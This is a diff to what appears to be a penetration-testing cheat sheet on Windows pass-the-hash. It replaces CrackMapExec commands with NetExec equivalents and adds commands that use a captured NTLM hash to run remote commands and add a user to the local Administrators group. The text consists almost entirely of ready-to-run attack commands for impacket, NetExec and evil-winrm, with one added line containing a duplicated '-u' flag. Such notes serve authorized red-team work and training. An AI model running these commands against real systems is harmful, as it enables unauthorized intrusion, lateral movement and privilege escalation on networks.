@@ -19,15 +19,19 @@ impacket-wmiexec $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH' -shell-type powershel
 # Impacket ATExec (single command via Task Scheduler)
 impacket-atexec $DOMAIN/$USER@$TARGET_IP -hashes ':$HASH' 'whoami'
 
-# CrackMapExec PtH
-crackmapexec smb $TARGET_IP -u $USER -H $HASH -x 'whoami'
-crackmapexec smb 10.10.10.0/24 -u Administrator -H ADMIN_HASH -x 'net user'
+# NetExec PtH
+nxc smb $TARGET_IP -u $USER -H $HASH -x 'whoami'
+nxc smb 10.10.10.0/24 -u Administrator -H ADMIN_HASH -x 'net user'
+nxc smb $TARGET_IP -u -u $ADMIN_USER -H $HASH --local-auth -x 'net localgroup Administrators $USER /add'
+
+# Impacket Pth
+impacket-net 'Administrator'@$TARGET_IP -hashes ':$HASH' localgroup -name Administrators -join $USER
 
 # Evil-WinRM (requires WinRM/5985 open)
 evil-winrm -i $TARGET_IP -u $USER -H $HASH
 
 # CME WinRM PtH
-crackmapexec winrm $TARGET_IP -u $USER -H $HASH
+nxc winrm $TARGET_IP -u $USER -H $HASH
 ```
 
 ```powershell
@@ -52,7 +56,7 @@ crackmapexec winrm $TARGET_IP -u $USER -H $HASH
 
 ```bash
 # Check WinRM availability
-crackmapexec winrm 10.10.10.0/24 -u $USER -p $PASS
+nxc winrm 10.10.10.0/24 -u $USER -p $PASS
 
 # Connect with password
 evil-winrm -i $TARGET_IP -u $USER -p $PASS
